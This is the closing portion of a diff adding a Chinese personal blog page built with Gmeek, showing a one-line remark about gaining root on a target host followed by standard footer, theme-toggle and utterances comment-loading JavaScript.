+<p>最终成功获得目标主机的root权限！！！</p>
+<p>耶！</p>
+</div>
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+</div>
+    <div id="footer">Copyright © <span id="year"></span><a href="https:/cha0s32.github.io"> 呆毛的博客 </a>
+<p>
+<span id="runday"></span>Powered by <a href="https://github.com/Meekdai/Gmeek" target="_blank">Gmeek</a>
+</p>
+
+<script>
+if(""!=""){
+    var now=new Date();
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("year").innerHTML=now.getFullYear();
+    if(""!=""){document.getElementById("runday").innerHTML=" • "+"网站运行"+diffDay+"天"+" • ";}
+    else{document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";}
+}
+</script>
+</div>
+</body>
+<script>
+var IconList={'post': 'M0 3.75C0 2.784.784 2 1.75 2h12.5c.966 0 1.75.784 1.75 1.75v8.5A1.75 1.75 0 0 1 14.25 14H1.75A1.75 1.75 0 0 1 0 12.25Zm1.75-.25a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-8.5a.25.25 0 0 0-.25-.25ZM3.5 6.25a.75.75 0 0 1 .75-.75h7a.75.75 0 0 1 0 1.5h-7a.75.75 0 0 1-.75-.75Zm.75 2.25h4a.75.75 0 0 1 0 1.5h-4a.75.75 0 0 1 0-1.5Z', 'link': 'm7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z', 'about': 'M10.561 8.073a6.005 6.005 0 0 1 3.432 5.142.75.75 0 1 1-1.498.07 4.5 4.5 0 0 0-8.99 0 .75.75 0 0 1-1.498-.07 6.004 6.004 0 0 1 3.431-5.142 3.999 3.999 0 1 1 5.123 0ZM10.5 5a2.5 2.5 0 1 0-5 0 2.5 2.5 0 0 0 5 0Z', 'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'search': 'M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z', 'rss': 'M2.002 2.725a.75.75 0 0 1 .797-.699C8.79 2.42 13.58 7.21 13.974 13.201a.75.75 0 0 1-1.497.098 10.502 10.502 0 0 0-9.776-9.776.747.747 0 0 1-.7-.798ZM2.84 7.05h-.002a7.002 7.002 0 0 1 6.113 6.111.75.75 0 0 1-1.49.178 5.503 5.503 0 0 0-4.8-4.8.75.75 0 0 1 .179-1.489ZM2 13a1 1 0 1 1 2 0 1 1 0 0 1-2 0Z', 'upload': 'M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 13.25 14Z M11.78 4.72a.749.749 0 1 1-1.06 1.06L8.75 3.811V9.5a.75.75 0 0 1-1.5 0V3.811L5.28 5.78a.749.749 0 1 1-1.06-1.06l3.25-3.25a.749.749 0 0 1 1.06 0l3.25 3.25Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z'};
+var utterancesLoad=0;
+if(localStorage.getItem("meek_theme")==null){localStorage.setItem("meek_theme","light");changeLight();}
+else if(localStorage.getItem("meek_theme")=="dark"){changeDark();}
+else if(localStorage.getItem("meek_theme")=="light"){changeLight();}
+
+function changeDark(){
+    document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="dark";
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList["moon"]);
+    document.getElementById("themeSwitch").parentNode.style.color="#00f0ff";
+    if(utterancesLoad==1){utterancesTheme("dark-blue");}
+}
+function changeLight(){
+    document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="light";
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList["sun"]);
+    document.getElementById("themeSwitch").parentNode.style.color="#ff5000";
+    if(utterancesLoad==1){utterancesTheme("github-light");}
+}
+function modeSwitch(){
+    if(document.getElementsByTagName("html")[0].attributes[0].value=="light"){changeDark();localStorage.setItem("meek_theme","dark");}
+    else{changeLight();localStorage.setItem("meek_theme","light");}
+}
+function utterancesTheme(theme){
+    const message = {type: 'set-theme',theme: theme};
+    const iframe = document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message, 'https://utteranc.es');
+}
+
+console.log("\n %c Gmeek last %c https://github.com/Meekdai/Gmeek \n\n", "color: #fff; background-image: linear-gradient(90deg, rgb(47, 172, 178) 0%, rgb(45, 190, 96) 100%); padding:5px 1px;", "background-image: linear-gradient(90deg, rgb(45, 190, 96) 0%, rgb(255, 255, 255) 100%); padding:5px 0;");
+</script>
+
+<script>
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","cha0s32/cha0s32.github.io");
+    script.setAttribute("issue-term","title");
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else{script.setAttribute("theme","github-light");}
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+</script>
+
+
+
+
+</html>
